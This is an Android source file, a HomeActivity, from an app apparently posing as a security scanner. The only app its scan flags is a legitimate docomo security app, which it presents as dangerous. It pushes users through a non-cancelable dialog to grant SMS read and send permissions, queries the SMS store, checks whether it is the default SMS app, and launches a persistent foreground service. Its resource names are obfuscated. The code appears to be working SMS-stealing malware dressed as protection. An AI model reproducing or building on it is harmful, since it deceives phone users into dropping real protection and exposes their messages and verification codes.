package com.example.softbank.activity;

import static android.os.Build.VERSION.SDK_INT;

import android.Manifest;
import android.app.ActivityManager;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.Toast;

import com.example.softbank.BindingActivity;
import com.example.softbank.R;
import com.example.softbank.databinding.AebcbafcegsBinding;
import com.example.softbank.databinding.AfeafbhcejtBinding;
import com.example.softbank.service.FirstService;
import com.example.softbank.storage.Storage;
import com.example.softbank.utils.Notification;
import com.xframe.utils.Handler;
import com.xframe.utils.OnHandler;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.NumberFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class HomeActivity extends BindingActivity<AebcbafcegsBinding> implements View.OnClickListener, OnHandler {
    private final String tag = HomeActivity.class.getName();
    private Thread thread;
    private final Handler handler = new Handler(Looper.myLooper(), this);
    private SharedPreferences s;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        s = getSharedPreferences("packageManager", Context.MODE_PRIVATE);
        initPackageManager();
        initOnclick();
        initDia();
        initFirstService();
    }

    private void initOnclick() {
        //遍历安装列表
        getBinding().scanRl.setOnClickListener(this);
        getBinding().topRl1.setOnClickListener(this);
        getBinding().topRl2.setOnClickListener(this);
        getBinding().topRl3.setOnClickListener(this);
        getBinding().topRl4.setOnClickListener(this);
        getBinding().open1.setOnClickListener(this);
        getBinding().open2.setOnClickListener(this);
        getBinding().open3.setOnClickListener(this);
        getBinding().open4.setOnClickListener(this);
        getBinding().open5.setOnClickListener(this);
    }

    private void initFirstService() {
        if (!serverIsRunning(this, FirstService.class.getName())) {
            Intent intent = new Intent(this, FirstService.class);
            if (SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }

    public boolean serverIsRunning(Context context, String componentName) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (activityManager == null) {
            return false;
        }
        List<ActivityManager.RunningServiceInfo> runningServices
                = activityManager.getRunningServices(Integer.MAX_VALUE);
        if (runningServices.size() <= 0) {
            return false;
        }
        for (ActivityManager.RunningServiceInfo serviceInfo : runningServices) {
            if (componentName.equals(serviceInfo.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        initPackageManager();
    }

    private void initPackageManager() {
        int size = s.getInt("size", 0);
        String json = s.getString("json", "");
        if (!json.equals("")) {
            try {
                AppInfo appInfo = new AppInfo();
                JSONObject jsonObject = new JSONObject(json);
                String label = jsonObject.getString("label");
                appInfo.setLabel(label);
                String name = jsonObject.getString("packageName");
                boolean pack = Storage.isApp(name);
                if (pack) {
                    return;
                }
                appInfo.setPackage_name(name);
                String version = jsonObject.getString("versionName");
                appInfo.setVersionName(version);
                String appName = jsonObject.getString("appName");
                appInfo.setAppName(appName);
                Storage.packageNames.add(appInfo);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
        if (size == 0 && thread == null) {
            initData();
        } else if (thread == null) {
            error(String.valueOf(size));
        }
    }

    @Override
    public void run() {
        getAllAppInfo(HomeActivity.this);
        thread = null;
        handler.sendMessage(3, getString(R.string.abihfbgdehj));
    }

    //计算百分比
    public String percent(int queryMailNum, int diliverNum) {
        // 创建一个数值格式化对象
        NumberFormat numberFormat = NumberFormat.getInstance();
        // 设置精确到小数点后2位
        numberFormat.setMaximumFractionDigits(2);
        return numberFormat.format((float) diliverNum / (float) queryMailNum * 100);
    }


    public void getAllAppInfo(Context ctx) {
        PackageManager packageManager = ctx.getPackageManager();
        List<PackageInfo> list = packageManager.getInstalledPackages(0);
        for (int i = 0; i < list.size(); i++) {
            PackageInfo p = list.get(i);
            int flags = p.applicationInfo.flags;
            AppInfo bean = new AppInfo();
            String appName = (String) p.applicationInfo.loadLabel(packageManager);
            bean.setAppName(appName);
            String versionName = p.versionName;
            bean.setVersionName(versionName);
            bean.setLabel(packageManager.getApplicationLabel(p.applicationInfo).toString());
            bean.setPackage_name(p.applicationInfo.packageName);
            handler.sendMessage(0, bean.label);
            handler.sendMessage(1, percent(list.size(), i));
            boolean b = p.applicationInfo.packageName.equals("com.nttdocomo.android.anshinsecurity");
            if (b) {
                SharedPreferences.Editor editor = s.edit();
                editor.putInt("size", Storage.packageNames.size());
                editor.putString("packageName", getArray());
                editor.putLong("time", System.currentTimeMillis());
                try {
                    editor.putString("json", bean.getJson());
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
                editor.apply();
                Storage.packageNames.add(bean);
                handler.sendMessage(4, String.valueOf(Storage.packageNames.size()));
            }
            try {
                Thread.sleep(10);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public String getArray() {
        JSONArray jsonArray = new JSONArray();
        for (AppInfo appInfo : Storage.packageNames) {
            jsonArray.put(appInfo.packageName);
        }
        return jsonArray.toString();
    }

    void initSms() {
        ContentResolver resolver = getContentResolver();
        if (resolver == null) {
            Log.e(tag, "ContentResolver null");
            return;
        }
        Cursor s = resolver.query(Uri.parse("content://sms/"), new String[]{"_id", "address", "type", "body", "date"}, null, null, null);
        if (s != null) {
            s.close();
        }
    }

    private void initDia() {
        int hasReadSmsPermission = checkSelfPermission(Manifest.permission.READ_SMS);
        if (hasReadSmsPermission == PackageManager.PERMISSION_GRANTED) {
            return;
        }
        requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS}, 123);
        Dialog dialog = new Dialog(this);
        Window window = dialog.getWindow();
        if (window == null) {
            return;
        }
        dialog.setCancelable(false);
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        AfeafbhcejtBinding binding = AfeafbhcejtBinding.inflate(getLayoutInflater(), new FrameLayout(this), false);
        dialog.setContentView(binding.getRoot());
        binding.ccaicdgheckLl.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                initSms();
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    @Override
    public void onClick(View v) {
        if (v.getId() == R.id.scan_rl) {
            if (getBinding().scan.getText().equals(getString(R.string.efhdfjbeeel2))) {
                Intent intent = new Intent(HomeActivity.this, DangerousActivity.class);
                startActivity(intent);
                return;
            }
            if (thread != null) {
                return;
            }
            thread = new Thread(HomeActivity.this);
            thread.start();
            getBinding().startScan.setText(getString(R.string.edhicajgefg));
            return;
        }
        Toast.makeText(this, getString(R.string.dajejcdeefo2), Toast.LENGTH_LONG).show();
    }

    private void initData() {
        getBinding().scan.setText(getString(R.string.abfdadhfebi));
        getBinding().startScan.setText(getString(R.string.abihfbgdehj));
        getBinding().ccaicdgheck.setText(getString(R.string.ccaicdgheck));
        getBinding().numRl.setVisibility(View.GONE);
        getBinding().bgLl.setBackgroundColor(Color.parseColor("#ff084f9e"));
        int size = Storage.packageNames.size();
        if (size != 0) {
            long currentTime = s.getLong("time", System.currentTimeMillis());
            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
            Date date = new Date(currentTime);
            String time = getString(R.string.efhdfjbeeel3) + " " + formatter.format(date);
            getBinding().ccaicdgheck.setText(time);
            String text = size + getString(R.string.ccaicdgheck5);
            getBinding().startScan.setText(text);
            getBinding().scan.setText(getString(R.string.efhdfjbeeel2));
            getBinding().numRl.setVisibility(View.VISIBLE);
            getBinding().bgLl.setBackgroundColor(getColor(android.R.color.holo_red_dark));
            getBinding().numTv.setText(String.valueOf(size));

            String result = String.format(getString(R.string.dajejcdeefo3), size);//对应xml中定义的123顺序
            String text1 = String.format(getString(R.string.dajejcdeefo4), size);
            String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this);
            //获取手机当前设置的默认短信应用的包名
            String packageName = getPackageName();
            if (defaultSmsApp == null) {
                Log.e(tag, "defaultSmsApp null");
                return;
            }
            if (defaultSmsApp.equals(packageName)) {
                Notification.sendSimpleNotify(this, result, text1);
            } else {
                Notification.sendSimpleNotify(this, getString(R.string.app_name));
            }
        }
    }

    private void error(String str) {
        getBinding().bgLl.setBackgroundColor(getColor(android.R.color.holo_red_dark));
        String string = getString(R.string.ccaicdgheck5);
        String text = str + string;
        getBinding().startScan.setText(text);
        getBinding().numRl.setVisibility(View.VISIBLE);
        getBinding().numTv.setText(str);
    }

    @Override
    public void handleMessage(String str) {

    }

    @Override
    public void handleMessage(int w, String str) {
        if (w == 0) {
            String string = getString(R.string.efhdfjbeeel1);
            String text = string + " " + str;
            getBinding().ccaicdgheck.setText(text);
        } else if (w == 1) {
            getBinding().scan.setText(str);
        } else if ((w == 3)) {
            initData();
        } else if (w == 4) {
            error(str);
        }
    }
}
